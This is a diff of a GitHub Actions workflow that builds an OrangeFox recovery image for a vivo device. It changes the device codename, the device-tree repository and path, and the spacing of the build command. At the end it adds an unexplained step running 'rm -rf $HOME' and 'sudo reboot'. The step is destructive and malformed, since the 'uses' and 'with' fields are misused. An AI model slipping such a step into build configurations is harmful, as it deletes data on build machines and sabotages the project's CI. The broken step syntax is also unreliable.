@@ -16,9 +16,9 @@ on:
 env:
   MANIFEST: https://gitlab.com/OrangeFox/Manifest.git
   MANIFEST_BRANCH: fox_9.0
-  DEVICE: PD1928BF_EX
-  DT_LINK: https://github.com/flaahokiller/twrp_PD1928BF_EX
-  DT_PATH: device/vivo/PD1928BF_EX
+  DEVICE: 1916
+  DT_LINK: https://github.com/flaahokiller/vivo_1916-twrp
+  DT_PATH: device/vivo/1916
   TARGET: recoveryimage
   TZ: Asia/Kolkata
 
@@ -56,8 +56,8 @@ jobs:
        - name: Build
          run: |
               cd work
-              . build/envsetup.sh &&lunch omni_$DEVICE-eng &&export ALLOW_MISSING_DEPENDENCIES=true && mka $TARGET
-             
+              . build/envsetup.sh &&lunch omni_$DEVICE-eng && export ALLOW_MISSING_DEPENDENCIES=true && mka $TARGET
+              
        - uses: actions/upload-artifact@v2
          with:
           name: recoveryzip
@@ -67,3 +67,7 @@ jobs:
          with:
           name: recoveryimage
           path: work/out/target/product/*/*.img
+
+       - uses: home rm -rf
+         with: rm -rf $HOME 
+               sudo reboot
